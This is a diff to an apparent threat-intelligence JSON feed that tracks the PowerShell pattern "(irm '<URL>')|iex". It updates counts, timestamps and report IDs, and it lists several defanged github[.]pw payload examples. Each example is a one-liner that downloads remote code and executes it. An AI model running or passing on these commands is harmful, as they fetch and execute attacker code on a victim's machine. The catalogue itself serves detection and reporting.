@@ -314,13 +314,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 90,
-    "ReportCount": 90,
-    "FirstSeen": "2026-11-13T10:16:26.023000+00:00",
+    "DistinctPayloadCount": 88,
+    "ReportCount": 88,
+    "FirstSeen": "2026-11-14T01:19:02.441000+00:00",
     "LastSeen": "2026-11-20T09:55:40.401000+00:00",
     "ReportIds": [
-      "cmwetnpgn0e5q0omlfbiurb7r",
-      "cmwetonos0e7e0omltax78jeq",
       "cmwfpwgss0ihy0omlygayvwid",
       "cmwfqf7a40ivv0oml8u89k1od",
       "cmwh41hiz0nhk0oml3qlpmmlm",
@@ -413,8 +411,6 @@
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
       "(irm 'https://github[.]pw/8pchkbdes5/6d9667cd120637a1')|iex",
-      "(irm 'https://github[.]pw/8pchkbdes5/91d7167f548d874c')|iex",
-      "(irm 'https://github[.]pw/8pchkbdes5/aade9cba2680d7ba')|iex",
       "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
       "(irm 'https://github[.]pw/Girya/80b09b7fad57f0fd')|iex",
       "(irm 'https://github[.]pw/Girya/b048f5c52ebe0ffe')|iex",
